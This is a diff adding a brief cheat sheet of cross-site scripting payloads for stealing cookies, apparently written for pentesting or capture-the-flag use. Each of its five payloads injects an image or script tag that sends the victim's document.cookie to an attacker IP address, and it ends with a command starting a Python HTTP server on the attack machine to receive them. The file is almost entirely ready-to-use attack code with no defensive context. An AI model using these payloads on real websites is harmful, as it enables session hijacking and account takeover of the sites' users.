@@ -1,0 +1,24 @@
+==============================================================================
+[+] Steal Coockie XXS
+==============================================================================
+# Payload 1
+<img src=x onerror=this.src='http://10.10.10.10/?c='+document.cookie>
+
+# Payload 2
+<script>
+alert(document.cookie);
+var i=new Image;
+i.src="http://192.168.0.18:8888/?"+document.cookie;
+</script>
+
+# Payload 3
+<script>var i=new Image;i.src="http://10.10.10.10/?"+document.cookie;</script
+
+# Payload 4
+<img src=x onerror=this.src='http://10.10.10.10/?'+document.cookie;>
+
+# Payload 5
+<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
+
+# Attack Machine
+sudo python -m SimpleHTTPServer 80
